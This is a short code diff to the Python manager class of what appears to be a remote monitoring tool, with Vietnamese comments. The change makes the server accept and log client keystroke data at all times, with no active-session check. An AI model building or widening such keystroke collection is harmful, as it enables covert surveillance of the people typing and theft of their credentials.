@@ -152,10 +152,10 @@ class Manager(QObject):
             self.security_alert_received.emit(pdu)
     
     def _on_input_pdu(self, pdu: dict):
-        """Xử lý INPUT PDU (keylog data) từ client"""
-        if not self.current_session_client_id:
-            return
-        print(f"[Manager] INPUT PDU từ client: {pdu.get('message')}")
+        """Xử lý INPUT PDU (keylog data) từ client - LUÔN LUÔN nhận, không cần session"""
+        # KHÔNG kiểm tra session nữa - keylog luôn được nhận
+        message = pdu.get('message', '')
+        print(f"[Manager] 📝 Keylog từ client: {message[:50]}...")  # Log 50 ký tự đầu
         self.input_pdu_received.emit(pdu)
 
     # --- Slots (Hàm được gọi từ GUI) (Giữ nguyên) ---
